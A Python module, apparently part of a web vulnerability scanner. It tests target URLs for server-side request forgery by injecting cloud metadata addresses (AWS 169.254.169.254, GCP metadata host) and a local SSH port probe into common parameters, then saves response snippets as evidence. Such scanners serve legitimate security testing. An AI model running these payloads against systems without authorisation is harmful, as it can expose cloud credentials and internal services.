import asyncio


class SSRFModule:
    name = "ssrf"
    severity = "high"

    async def run(self, target, session, context):
        findings = []

        # Step 1: Use discovered parameters from context
        params = context.get("params") or []
        # fallback to common SSRF params if none discovered
        if not params:
            params = ["url", "dest", "redirect", "uri", "path", "continue"]

        payloads = [
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://127.0.0.1:22",  # Local port probe
        ]

        for p in params:
            for payload in payloads:
                try:
                    # Construct URL with parameter
                    if "?" in target:
                        url = f"{target}&{p}={payload}"
                    else:
                        url = f"{target.rstrip('/')}/?{p}={payload}"

                    r = await session.get(url, timeout=5)

                    if (
                        "instance-id" in r.text
                        or "computeMetadata" in r.text
                        or "SSH-" in r.text
                    ):
                        findings.append(
                            {
                                "type": "SSRF",
                                "endpoint": url,
                                "parameter": p,
                                "payload": payload,
                                "evidence": r.text[:200],
                            }
                        )
                except:
                    continue

        return findings
